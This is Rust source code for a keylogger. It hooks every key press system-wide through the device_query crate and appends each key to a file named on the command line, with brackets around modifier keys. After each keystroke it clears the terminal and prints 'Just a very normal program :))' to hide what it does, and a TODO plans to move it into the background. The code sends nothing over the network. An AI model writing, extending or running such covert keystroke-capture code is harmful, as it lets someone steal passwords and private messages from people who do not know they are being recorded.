use std::env;
use std::io::Write;
use std::fs::{File, OpenOptions};
use device_query::{DeviceEvents, DeviceState, Keycode};

// This function creates a file with given name at second argument
pub fn create_file() -> std::io::Result<()> {
    println!("Creating a file in case of there isn't any...");
    let args: Vec<String> = env::args().collect();
    let filename = &args[1];
    File::create(filename)?;
    Ok(())
}

// All of the keylogging and parsing process
pub fn keyloggs() {

    // Setting new device state and listening to events
    let device_state = DeviceState::new();
    let _guard = device_state.on_key_down(move |key| {

        // Parsing arguments and opening the file with write permission
        let args: Vec<String> = env::args().collect();
        let filename = &args[1];
        let mut file = OpenOptions::new()
            .write(true)
            .read(true)
            .append(true)
            .open(filename)
            .expect("Something went wrong while opening the file!");
        let data = &key.to_string().to_lowercase(); // Default data to log

        // Log parser
        // TODO: Slash, Backslash, numbers
        match key {
            &Keycode::Enter => file.write(b"\n").expect("Something went wrong while editing the file!"),
            &Keycode::Space => file.write(b" ").expect("Something went wrong while editing the file!"),
            &Keycode::LShift |
            &Keycode::RShift |
            &Keycode::LControl |
            &Keycode::RControl |
            &Keycode::Escape |
            &Keycode::CapsLock |
            &Keycode::Meta => {
                let data = "[".to_owned() + &key.to_string() + "]";
                file.write(data.as_bytes()).expect("Something went wrong while editing the file!")
            }
            _ => file.write(data.as_bytes()).expect("Something went wrong while editing the file!"),
        };

        // Clearing terminal and showing a message
        // TODO: Switch to background app
        print!("\x1B[2J\x1B[1;1H");
        println!("Just a very normal program :))");
    });
    loop {} // Starts a loop so program doesn't die
}
